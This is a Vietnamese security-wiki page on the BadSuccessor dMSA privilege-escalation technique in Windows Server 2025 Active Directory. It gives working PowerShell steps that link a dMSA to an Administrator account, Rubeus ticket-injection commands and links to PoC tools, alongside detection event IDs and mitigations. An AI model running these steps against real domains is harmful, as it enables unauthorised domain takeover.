# BadSuccessor: Leo thang đặc quyền thông qua lạm dụng di chuyển dMSA được ủy quyền

{{#include ../../banners/hacktricks-training.md}}

## Tổng quan

Delegated Managed Service Accounts (**dMSA**) là thế hệ kế nhiệm của **gMSA**, được tích hợp trong Windows Server 2025. Quy trình di chuyển hợp pháp cho phép quản trị viên thay thế một tài khoản *cũ* (tài khoản người dùng, máy tính hoặc dịch vụ) bằng dMSA mà vẫn giữ nguyên các quyền một cách minh bạch. Quy trình này được cung cấp qua các PowerShell cmdlet như `Start-ADServiceAccountMigration` và `Complete-ADServiceAccountMigration`, đồng thời dựa vào hai thuộc tính LDAP của **đối tượng dMSA**:

* **`msDS-ManagedAccountPrecededByLink`** – *liên kết DN* đến tài khoản cũ bị thay thế.
* **`msDS-DelegatedMSAState`**       – trạng thái di chuyển (`0` = không có, `1` = đang diễn ra, `2` = *đã hoàn tất*).<sup>[[1]](#references)</sup>

Nếu kẻ tấn công có thể tạo **bất kỳ** dMSA nào trong một OU và trực tiếp thao túng 2 thuộc tính đó, LSASS và KDC sẽ xem dMSA là tài khoản *kế nhiệm* của tài khoản được liên kết. Khi kẻ tấn công xác thực bằng dMSA, **họ sẽ thừa hưởng mọi đặc quyền của tài khoản được liên kết** – có thể lên đến **Domain Admin** nếu liên kết với tài khoản Administrator.<sup>[[1]](#references)</sup>

Kỹ thuật này được Unit 42 đặt tên là **BadSuccessor** vào năm 2025. Sau đó, Microsoft gán mã **CVE-2025-53779** cho kỹ thuật này và phát hành bản cập nhật bảo mật vào **tháng 8 năm 2025**. Kỹ thuật này vẫn còn liên quan đến các môi trường Windows Server 2025 chưa được vá và việc rà soát các quyền ủy quyền nguy hiểm trên OU.<sup>[[1]](#references)[[2]](#references)[[6]](#references)</sup>

### Điều kiện tiên quyết của cuộc tấn công

1. Một tài khoản được *phép* tạo đối tượng bên trong **Đơn vị tổ chức (OU)** *và* có ít nhất một trong các quyền sau:
   * `Create Child` → lớp đối tượng **`msDS-DelegatedManagedServiceAccount`**
   * `Create Child` → **`All Objects`** (tạo đối tượng chung)
2. Có kết nối mạng đến LDAP và Kerberos (tình huống máy tính tham gia domain thông thường / tấn công từ xa).<sup>[[1]](#references)</sup>

## Liệt kê các OU dễ bị tấn công

Unit 42 đã phát hành một script hỗ trợ PowerShell phân tích security descriptor của từng OU và làm nổi bật các ACE cần thiết:<sup>[[1]](#references)</sup>

```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```

Bên dưới, script thực hiện tìm kiếm LDAP phân trang với `(objectClass=organizationalUnit)` và kiểm tra từng `nTSecurityDescriptor` để tìm

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8` (object class *msDS-DelegatedManagedServiceAccount*)

## Các bước khai thác

Sau khi xác định được một OU có quyền ghi, chỉ cần thực hiện thêm 3 thao tác ghi LDAP để hoàn tất cuộc tấn công:<sup>[[1]](#references)</sup>

```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
                     -DNSHostName host.contoso.local \
                     -Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
    @{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```

Sau khi replication, attacker có thể **logon** bằng `attacker_dMSA$` hoặc yêu cầu Kerberos TGT – Windows sẽ tạo token của account *superseded*.<sup>[[1]](#references)</sup>

### Tự động hóa

Một số PoC công khai đóng gói toàn bộ quy trình, bao gồm việc lấy password và quản lý ticket:

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)<sup>[[3]](#references)</sup>
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)<sup>[[4]](#references)</sup>
* NetExec module – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)<sup>[[5]](#references)</sup>

### Post-Exploitation

```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```

## Phát hiện & Săn tìm

Bật **Kiểm tra đối tượng** trên các OU và giám sát những Windows Security Event sau:<sup>[[1]](#references)[[2]](#references)</sup>

* **5137** – Tạo đối tượng **dMSA**
* **5136** – Sửa đổi **`msDS-ManagedAccountPrecededByLink`**
* **4662** – Thay đổi thuộc tính cụ thể
  * GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
  * GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – Cấp TGT cho dMSA

Tương quan các sự kiện `4662` (sửa đổi thuộc tính), `4741` (tạo tài khoản máy tính/dịch vụ) và `4624` (đăng nhập tiếp theo) giúp nhanh chóng phát hiện hoạt động BadSuccessor. Các giải pháp XDR như **XSIAM** có sẵn các truy vấn để sử dụng (xem phần tham khảo).<sup>[[2]](#references)</sup>

## Giảm thiểu

* Cài đặt bản cập nhật bảo mật của Microsoft cho **CVE-2025-53779** và xác minh cấp độ bản vá trên mọi domain controller Windows Server 2025.<sup>[[6]](#references)</sup>
* Áp dụng nguyên tắc **đặc quyền tối thiểu** – chỉ ủy quyền quản lý *Service Account* cho các vai trò đáng tin cậy.
* Xóa quyền `Create Child` / `msDS-DelegatedManagedServiceAccount` khỏi các OU không yêu cầu rõ ràng quyền này.
* Giám sát các event ID nêu trên và cảnh báo khi danh tính *không thuộc Tier 0* tạo hoặc chỉnh sửa dMSA.

## Xem thêm


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [BadSuccessor: Lạm dụng dMSA để leo thang đặc quyền trong Active Directory – Akamai](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [2] [Unit42 – Khi tài khoản tốt hóa xấu: Khai thác Delegated Managed Service Account](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [3] [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [4] [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [5] [NetExec BadSuccessor module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)
- [6] [Microsoft Security Response Center – CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
{{#include ../../banners/hacktricks-training.md}}
